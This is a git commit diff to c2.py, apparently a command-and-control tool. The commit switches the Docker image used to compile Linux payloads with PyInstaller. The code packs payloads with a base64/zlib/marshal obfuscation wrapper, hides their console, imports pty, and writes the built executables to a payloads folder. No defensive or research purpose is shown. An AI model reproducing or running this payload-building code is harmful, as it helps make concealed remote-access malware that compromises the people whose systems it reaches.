a279b791bd0c50a89e6df4a290d2fc32cd5734f7
Oz Abramovich <184321725+Dark-Avenger-Reborn@users.noreply.github.com>
2024-11-14 17:18:10 -0500

    switched linux to slim

--- c2.py
+++ c2.py
@@ -187,7 +187,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
             shutil.copy(f"dist/{payload_file_name}.exe", f"payloads/{payload_file_name}.exe")
 
         elif os_name == "Linux":
-            result = subprocess.run(f'docker run --platform linux/amd64 --volume "$(pwd):/src/" batonogov/pyinstaller-linux:latest "pyinstaller -F --onefile --windowed --hidden-import=pty --hide-console hide-early {payload_file_name}.py"', shell=True, capture_output=True)
+            result = subprocess.run(f'docker run --platform linux/amd64 --volume "$(pwd):/src/" batonogov/pyinstaller-linux-slim:latest "pyinstaller -F --onefile --windowed --hidden-import=pty --hide-console hide-early {payload_file_name}.py"', shell=True, capture_output=True)
             print(result.stdout.decode(), result.stderr.decode())  # Print output for debugging
             shutil.copy(f"dist/{payload_file_name}", f"payloads/{payload_file_name}")
 
